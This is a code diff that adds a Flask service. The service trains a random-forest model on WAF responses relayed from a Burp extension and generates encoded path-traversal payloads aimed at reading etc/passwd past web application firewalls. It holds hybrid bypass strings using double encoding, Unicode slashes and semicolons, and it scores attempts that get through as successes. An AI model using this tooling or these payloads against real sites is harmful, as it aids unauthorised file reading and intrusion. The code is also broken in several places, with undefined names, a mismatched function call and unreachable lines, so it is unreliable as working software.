@@ -1,0 +1,197 @@
+from flask import Flask, request, jsonify
+import numpy as np
+import pandas as pd
+from sklearn.feature_extraction.text import TfidfVectorizer
+from sklearn.ensemble import RandomForestClassifier
+import joblib
+import random
+import os
+app = Flask(__name__)
+
+# --- GLOBAL AI STATE ---
+experience_buffer = []
+model = None
+# Character-level TF-IDF to catch sneaky bypass patterns
+tfidf = TfidfVectorizer(analyzer='char', ngram_range=(2, 4))
+encodings = ["none", "url_double", "unicode", "null_byte", "semicolon_bypass"]
+# --- BOOTSTRAP THE BRAIN (CRITICAL FIX: Moved to global level) ---
+if os.path.exists('active_waf_model.pkl') and os.path.exists('active_tfidf.pkl'):
+    try:
+        model = joblib.load('active_waf_model.pkl')
+        tfidf = joblib.load('active_tfidf.pkl')
+        print("[+] SUCCESS: AI Memory restored from disk. Ready to hunt.")
+    except Exception as e:
+        print(f"[!] Error loading brain: {e}")
+        model = None
+else:
+    print("[!] No brain found. Starting fresh.")
+# --- AI CORE: TRAINING ---
+def train_agent(data_list):
+    df = pd.DataFrame(data_list)
+   
+    # 1. Fit the TF-IDF (The Senses)
+    payload_vectors = tfidf.fit_transform(df['payload'].fillna(''))
+    feature_names = tfidf.get_feature_names_out().tolist()
+    all_feature_names = feature_names + ["WAF_CODE", "LOG_LATENCY"]
+   
+    # 2. Prepare Features
+    waf_scores = df['waf_reaction_code'].astype(float).values.reshape(-1, 1)
+    latencies = np.log1p(df['latency_ms'].astype(float)).values.reshape(-1, 1)
+    X = np.hstack((payload_vectors.toarray(), waf_scores, latencies))
+   
+    # 3. PROXIMITY SCORING (The "Heat Map")
+    y = []
+    for _, row in df.iterrows():
+        score = 0.0
+        # If it's a 200 or 500, it's a massive win
+        if row['status_code'] in [200, 500]:
+            score = 1.0
+        # If the WAF code is one that usually precedes a bypass
+        elif str(row['waf_reaction_code']) in ['341', '344']:
+            score = 0.8
+        # If the server took a long time to answer (Potential "Hanging" WAF)
+        elif row['latency_ms'] > 2000:
+            score = 0.4
+        
+        y.append(1 if score > 0.3 else 0) # We still use 1/0 for the model, but we 'promote' interesting failures to 1
+        # If we have NO successes in our data, add a 'Ghost' success to prevent the crash
+        if sum(y) == 0:
+            y[0] = 1 # Force the first item to be a 'Success' so the model has 2 columns
+    # ... (Rest of the training) ...
+    # 4. Train the Random Forest (The Brain)
+    clf = RandomForestClassifier(n_estimators=100)
+    clf.fit(X, y)
+   
+# Create directory if it doesn't exist
+    path = f"models/{context_name}/"
+    if not os.path.exists(path): os.makedirs(path)
+    
+    # SAVE WITH CONTEXT NAME
+    joblib.dump(clf, f"{path}model.pkl")
+    joblib.dump(tfidf, f"{path}tfidf.pkl")
+    
+    with open(f"{path}history.json", 'w') as f:
+        json.dump(data_list, f)
+        
+    print(f"[*] Brain updated for context: {context_name}")
+    # 5. Output reasoning to the terminal
+    importances = clf.feature_importances_
+    indices = np.argsort(importances)[::-1]
+   
+    print("\n" + "="*50)
+    print("      [MODEL SAVED & ANALYZED]      ")
+    print("="*50)
+    for i in range(min(5, len(all_feature_names))):
+        print(f"Top Feature {i+1}: {all_feature_names[indices[i]]}")
+    print("="*50 + "\n")
+   
+    return clf
+# --- ROUTES ---
+
+@app.route('/analyze', methods=['POST'])
+def handle_training():
+    global experience_buffer, model
+    data = request.json
+    if not isinstance(data, list): data = [data]
+    
+    for entry in data:
+        # 1. Identify Context (e.g., 'socrata' or 'cloudfront')
+        # You can send this from your Burp extension
+        context = entry.get('waf_type', 'generic') 
+        entry['context'] = context
+        
+        # 2. Add to the global buffer
+        experience_buffer.append(entry)
+        
+    # 3. Train a Context-Specific Model
+    # We only train using data from the CURRENT context
+    current_context = data[0].get('waf_type', 'generic')
+    context_data = [e for e in experience_buffer if e['context'] == current_context]
+    
+    if len(context_data) > 0:
+        model = train_agent(context_data, current_context)
+        
+    return jsonify({"status": "context_updated", "context": current_context})
+def create_hybrid(base_path):
+    # This function blends the "bad" patterns
+    hybrids = [
+        f"..%252f..;/{base_path}",     # Double Encoding + Semicolon
+        f"..%u2215..%252f{base_path}",  # Unicode + Double Encoding
+        f"/%2e%2e%2f..;/{base_path}",   # Hex Dot + Semicolon
+    ]
+    return random.choice(hybrids)
+
+@app.route('/generate_attack', methods=['GET'])
+def generate_attack():
+    global model, tfidf
+    # Get context from query param: /generate_attack?waf=cloudfront
+    context = request.args.get('waf', 'generic')
+    
+    # Load the specific parents for this WAF
+    context_path = f"models/{context}/history.json"
+    if os.path.exists(context_path):
+        with open(context_path, 'r') as f:
+            local_buffer = json.load(f)
+        parents = get_top_parents(local_buffer)
+    else:
+        parents = ["../etc/passwd"] # Fresh start for new WAF
+    target_path = "etc/passwd"
+   
+    if model is None:
+        return jsonify({"payload": f"../{target_path}", "technique": "initial_random"})
+
+    candidates = []
+    for _ in range(100): # Increase candidates for better refinement
+        p = create_hybrid(target_path)
+        candidates.append(p)
+
+    # Convert candidates to TF-IDF vectors
+    vectors = tfidf.transform(candidates).toarray()
+   
+    # Use "Neutral" metadata for the prediction (WAF=0, Latency=500ms)
+    meta = np.tile([0, np.log1p(500)], (100, 1))
+    X_test = np.hstack((vectors, meta))
+   
+    # The AI predicts probabilities
+    probs_all = model.predict_proba(X_test)
+    
+    # CHECK: Does the model even know about 'Success' (Label 1) yet?
+    if probs_all.shape[1] > 1:
+        # If yes, take the probability of success
+        probs = probs_all[:, 1]
+    else:
+        # If no, the AI only knows failure. 
+        # We take the INVERSE of failure probability (which will be 0)
+        probs = 1 - probs_all[:, 0]
+   
+    return jsonify({
+        "payload": candidates[best_idx],
+        "confidence": f"{probs[best_idx]:.2%}",
+        "reasoning": "Hybrid Normalization Test"
+    }) 
+@app.route('/analyze_response', methods=['POST'])
+def analyze_response():
+    data = request.json
+    status = data.get('status_code')
+    waf = data.get('waf_reaction_code', '0')
+    payload = data.get('payload', 'Unknown')
+
+    if status == 403:
+        print(f"[-] BLOCKED: WAF Code {waf} rejected {payload}")
+    elif status == 500:
+        print(f"[*] CRASH/ERROR: Potential bug found with {payload}")
+    elif status == 200:
+        print(f"[+] SUCCESS: Payload passed with status 200!")
+
+    return jsonify({"status": "processed"})
+    # --- BOOTSTRAP THE BRAIN ---
+    try:
+        model = joblib.load('active_waf_model.pkl')
+        tfidf = joblib.load('active_tfidf.pkl')
+        print("[+] Brain loaded from disk. Ready to hunt.")
+    except Exception as e:
+        model = none 
+        print("[!] No brain found. Waiting for first training samples...")
+if __name__ == "__main__":
+    print("[+] stand-alone AI Agent starting on port 5000...")
+    app.run(host='127.0.0.1', port=5000, debug=True)
